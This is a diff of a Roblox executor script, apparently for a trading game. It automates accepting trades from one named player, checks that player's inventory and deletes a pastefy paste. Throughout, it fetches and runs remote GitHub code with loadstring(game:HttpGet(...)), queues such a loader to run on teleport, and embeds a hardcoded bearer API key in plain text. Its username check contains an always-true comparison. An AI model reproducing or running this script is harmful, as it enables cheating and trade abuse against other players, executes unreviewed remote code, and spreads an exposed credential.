@@ -4,27 +4,9 @@ if _G.gg then
     return
 end
 _G.gg = true
---// Services
-local HttpService = game:GetService("HttpService")
+repeat wait() until game:IsLoaded()
+repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
 
---// Конфиг
-local apiKey = "FsTgs7lxObDHAOFZXRgkeO8nYOARMaJjPsInJKi59PysbJGBTPFRzCmnrna2"
---// Заголовки запроса
-
-local function parseDateTime(dateStr)
-    local year, month, day, hour, min, sec = dateStr:match("(%d+)%-(%d+)%-(%d+) (%d+):(%d+):(%d+)")
-    if year then
-        return os.time({
-            year = tonumber(year),
-            month = tonumber(month),
-            day = tonumber(day),
-            hour = tonumber(hour),
-            min = tonumber(min),
-            sec = tonumber(sec)
-        })
-    end
-    return 0
-end
 function missing(t, f, fallback)
     if type(f) == t then return f end
     return fallback
@@ -32,29 +14,136 @@ end
 
 queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
 
+print("PlayerGui и Humanoid загружены!")
+
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+repeat wait(2) 
+    print('waiting')
+    local selectt = playerGui.DeviceSelect.Container.Tablet.Button
+    getconnections(selectt.MouseButton1Click)[1]:Fire()
+until not player.PlayerGui:FindFirstChild("DeviceSelect")
+
+local targetName = getgenv().name
+local function get_device_type()
+    repeat wait(1) 
+        print('waiting2')
+    until player.PlayerGui:FindFirstChild("MainGUI")
+    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
+    local lobbygui = maingui:FindFirstChild("Lobby")
+    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
+    return MobileState and 'mobile' or 'tablet'
+end
+
+local DEVICE_TYPE = get_device_type()
+
+game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
+    lastOfferTime = args.LastOffer
+end)
+local tradeGUI2 = playerGui:WaitForChild("TradeGUI")
+local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
+
+local container = TDselect:WaitForChild("Container")
+-- Получаем кнопки
+local actions = container:WaitForChild("Trade"):WaitForChild("Actions")
+local acceptcon = actions:WaitForChild("Accept")
+
+-- Получаем TradeRequest GUI
+local tradeRequest2 = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
+local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2
+
+TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
+    if TradeRequest.Visible then
+        local usernameLabel = TradeRequest:FindFirstChild("ReceivingRequest") and TradeRequest.ReceivingRequest:FindFirstChild("Username")
+        if usernameLabel then
+            -- Если текст уже корректный и наш доверенный игрок
+            if usernameLabel.Text == targetName then
+                handleTrade(usernameLabel.Text)
+            elseif usernameLabel.Text == "Nikilis" or "PLAYER_NAME1" then
+                -- Ждём, пока текст сменится на реального игрока
+                local conn
+                conn = usernameLabel:GetPropertyChangedSignal("Text"):Connect(function()
+                    if usernameLabel.Text ~= "Nikilis" or "PLAYER_NAME1" then
+                        conn:Disconnect()
+                        if usernameLabel.Text == targetName then
+                            handleTrade(usernameLabel.Text)
+                        else
+                            print("Трейд от недоверенного игрока:", usernameLabel.Text)
+                        end
+                    end
+                end)
+            else
+                -- Трейд от недоверенного игрока
+                print("Трейд от недоверенного игрока:", usernameLabel.Text)
+            end
+        end
+    end
+end)
+
+
+TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if TDselect.Enabled then
+        local firstSlot = TDselect.Container.Trade.TheirOffer.Container.NewItem1
+        repeat
+            wait(0.7)
+            if not TDselect.Enabled then
+                print("трейд закрылся в логике офера")
+                return
+            end
+        until firstSlot.Visible
+
+        local cooldown = acceptcon:WaitForChild("Cooldown")
+
+        repeat
+            wait(0.5)
+            if not TDselect.Enabled then
+                print("трейд закрылся в логике кулдавна")
+                return
+            end
+        until not cooldown.Visible
+
+        print("cool")
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferTime)
+    else
+        print("трейд гай закрылся")
+    end
+end)
+local HttpService = game:GetService("HttpService")
+
+local apiKey = "FsTgs7lxObDHAOFZXRgkeO8nYOARMaJjPsInJKi59PysbJGBTPFRzCmnrna2"
+
+local deleteUrl = "https://pastefy.app/api/v2/paste/" .. getgenv().paste
+
 local headers = {
     Accept = "application/json",
     ["Content-Type"] = "application/json",
     ["Authorization"] = "Bearer " .. apiKey,
 }
 
-local function deletePaste(pasteId)
-    if not pasteId then
-        warn("❌ Paste ID не задан!")
-        return false, "Paste ID не задан"
-    end
+local function deletePaste()
+    local req = {
+        Url = deleteUrl,
+        Method = "DELETE",
+        Headers = headers,
+    }
 
-    local deleteUrl = "https://pastefy.app/api/v2/paste/" .. pasteId
-    local req = { Url = deleteUrl, Method = "DELETE", Headers = headers }
     local response = request(req)
 
+    -- базовая проверка на наличие ответа
     if not response then 
-        warn("❌ Нет ответа от сервера")
         return false, "No response from request()"
     end
 
+    -- логируем статус для дебага
     print(("HTTP %s %s"):format(response.StatusCode or "?", response.StatusMessage or ""))
 
+    -- парсим тело ответа
     local parsed = nil
     if response.Body and response.Body ~= "" then
         local ok, res = pcall(function() 
@@ -63,154 +152,119 @@ local function deletePaste(pasteId)
         if ok then
             parsed = res
         else
-            print("⚠️ Не удалось разобрать JSON, возможно это текстовое сообщение:", response.Body)
-            parsed = { success = false, message = response.Body }
+            return false, ("Invalid JSON in response body: %s"):format(tostring(response.Body))
         end
     end
 
-    if response.StatusCode == 404 then
-        warn("❌ Паста не найдена или уже удалена:", pasteId)
-        return false, parsed
-    end
-
+    -- проверяем успех удаления
     if parsed and parsed.success then
-        print("✅ Паста успешно удалена!")
+        print("Paste успешно удалена!")
         return true, parsed
     end
 
+    -- иногда код 200/204 без parsed — считаем успехом
     if response.StatusCode == 200 or response.StatusCode == 204 then
-        print("✅ Паста удалена (нет тела ответа)")
         return true, parsed
     end
 
-    warn("❌ Не удалось удалить пасту:", parsed)
-    return false, parsed
+    -- неуспешный ответ
+    local err = {
+        status = response.StatusCode,
+        statusMessage = response.StatusMessage,
+        body = response.Body,
+        successFlag = parsed and parsed.success or nil
+    }
+    return false, err
 end
 
-
-
-local TeleportService = game:GetService("TeleportService")
-
-TeleportService.TeleportInitFailed:Connect(function(result)
-    if result == Enum.TeleportResult.GameNotFound then
-        warn("❌ Телепортация не удалась: сервер не найден или уже закрыт.")
-    elseif result == Enum.TeleportResult.Failure then
-        warn("⚠️ Телепортация не удалась: неизвестная ошибка.")
-    else
-        warn("ℹ️ Результат телепортации:", result)
-    end
-    -- Удаляем пасту во всех случаях неуспеха
-    deletePaste(getgenv().paste)
-end)
-
---// Получение самой старой пасты
-local function getOldestPaste()
-    local response = request({
-        Url = "https://pastefy.app/api/v2/user/pastes",
-        Method = "GET",
-        Headers = headers
-    })
-
-    -- Проверка кода ответа
-    if not response or response.StatusCode ~= 200 then
-        warn("❌ Ошибка при получении паст:", response and response.StatusCode, response and response.StatusMessage)
-        if response and response.Body then
-            warn("Ответ сервера:", response.Body)
+-- Функция для обработки трейда
+function handleTrade(requesterName)
+    local args = {}
+    if requesterName == targetName then
+        -- Наш игрок, принимаем трейд
+        if TradeRemote:FindFirstChild("AcceptRequest") then
+            TradeRemote.AcceptRequest:FireServer(unpack(args))
+            print("Принят трейд от " .. requesterName)
         end
-        return
-    end
-
-    -- Декодируем JSON
-    local ok, data = pcall(function()
-        return HttpService:JSONDecode(response.Body)
-    end)
-
-    if not ok or not data or #data == 0 then
-        warn("⚠️ Пасты не получены или массив пуст.")
-        return
-    end
-
-    -- Сортировка по timestamp
-    table.sort(data, function(a, b)
-        return parseDateTime(a.created_at) < parseDateTime(b.created_at)
-    end)
-
-    local oldest = data[1]
-    if not oldest then
-        warn("⚠️ Паста не найдена.")
-        return
-    end
-
-    local content = oldest.content or ""
-    local lines = {}
-    for line in content:gmatch("[^\r\n]+") do
-        table.insert(lines, line)
-    end
-
-    local jobId = lines[1] -- первая строка
-    local playerName = lines[2] -- вторая строка
-
-    if jobId then
-        print("🧩 Самая старая паста ID:", oldest.id)
-        getgenv().name = playerName
-        getgenv().paste = oldest.id
-        local name = getgenv().name or ""
-        local paste = getgenv().paste or ""
-        local codeUrl = "https://raw.githubusercontent.com/Roma77799/testik/refs/heads/main/test2"
-
-        queueCode = string.format([[
-            getgenv().name = "%s"
-            getgenv().paste = "%s"
-
-            spawn(function()
-                repeat task.wait() until game:IsLoaded()
-                local success, err = pcall(function()
-                    local code
-                    if game.HttpGetAsync then
-                        code = game:HttpGetAsync("%s")
-                    else
-                        code = game:HttpGet("%s")
-                    end
-
-                    if not code or code == "" then
-                        error("Failed to fetch script or empty response")
-                    end
-
-                    if code:sub(1,1) == "<" then
-                        error("Получен HTML вместо Lua. Проверь URL или используйте raw/pastefy.")
-                    end
-
-                    local func, compileErr = loadstring(code)
-                    if not func then
-                        error("Ошибка компиляции скрипта: " .. tostring(compileErr))
-                    end
-
-                    func()
-                end)
-
-                if not success then
-                    warn("Ошибка при выполнении скрипта после телепорта:", err)
-                end
-            end)
-        ]], name, paste, codeUrl, codeUrl)
-
-
-        game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, jobId)
     else
-        warn("⚠️ JobId в пасте не найден!")
-        print("Содержимое пасты:\n" .. content)
+        -- Не наш игрок, отклоняем трейд
+        if TradeRemote:FindFirstChild("DeclineRequest") then
+            TradeRemote.DeclineRequest:FireServer(unpack(args))
+            print("Отклонен трейд от " .. requesterName)
+        end
     end
 end
 
 game.Players.LocalPlayer.OnTeleport:Connect(function()
     if queueteleport then
-        queueteleport(queueCode)
+        queueteleport("loadstring(game:HttpGet('https://github.com/Roma77799/testik/raw/refs/heads/main/test1',true))()")
     else
         print("queue нету")
     end
 end)
 
+-- Функция проверки
+local function checkPlayer()
+    print("слушаем1111")
+    local targetPlayer = Players:FindFirstChild(targetName)
+
+    if targetPlayer then
+        print(targetName .. " найден в игре!")
+    else
+        print(targetName .. " не найден, вас кикают!")
+        if LocalPlayer then
+            print("Игрок " .. targetName .. " не найден в игре!")
+            deletePaste()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop'),true))()
+            return
+        end
+    end
+end
+local function checkInventory()
+    local args = { [1] = targetName }
+
+    local success, result = pcall(function()
+        return ReplicatedStorage:WaitForChild("Remotes")
+            :WaitForChild("Extras")
+            :WaitForChild("GetFullInventory")
+            :InvokeServer(unpack(args))
+    end)
+
+    if not success or not result then
+        warn("Не удалось получить инвентарь:", result)
+        return
+    end
+
+    local weapons = result.Weapons or {}
+    local owned = weapons.Owned or {}
+
+    -- Проверяем, пустой ли инвентарь (нет оружия ИЛИ остались только дефолтные)
+    local isOnlyDefault = true
+    local hasAnyWeapon = next(owned) ~= nil
+
+    if hasAnyWeapon then
+        for weaponName in pairs(owned) do
+            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
+                isOnlyDefault = false
+                break
+            end
+        end
+    end
+
+    if not hasAnyWeapon or isOnlyDefault then
+        deletePaste()
+        print("все пусто нахуй! (только дефолт остался)")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop", true))()
+        return
+    else
+        print("Игрок имеет оружие!")
+    end
+end
+
+print("Скрипт загружен")
+
 while true do
-    getOldestPaste()
-    wait(1)
+    checkPlayer()
+    checkInventory()
+    wait(2)
 end
